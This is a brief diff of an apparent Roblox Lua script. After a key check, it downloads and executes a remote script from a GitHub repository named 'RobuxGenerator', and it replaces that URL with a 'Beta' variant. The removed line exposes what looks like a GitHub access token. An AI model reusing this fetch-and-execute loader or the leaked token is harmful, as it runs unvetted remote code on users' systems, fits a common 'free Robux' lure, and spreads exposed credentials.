@@ -68,7 +68,7 @@ local function enterKey()
     if userInputKey == correctKey then
         local scriptURL = "scriptlink"
         local success, result = pcall(function()
-            return loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptDLC/RobuxGenerator/main/RobuxMenu?token=GHSAT0AAAAAACVUAH7JGYKBEFAXMECH42FIZVNA2AA"))()
+            return loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptDLC/RobuxGeneratorBeta/main/cool"))()
         end)
 
         if success then
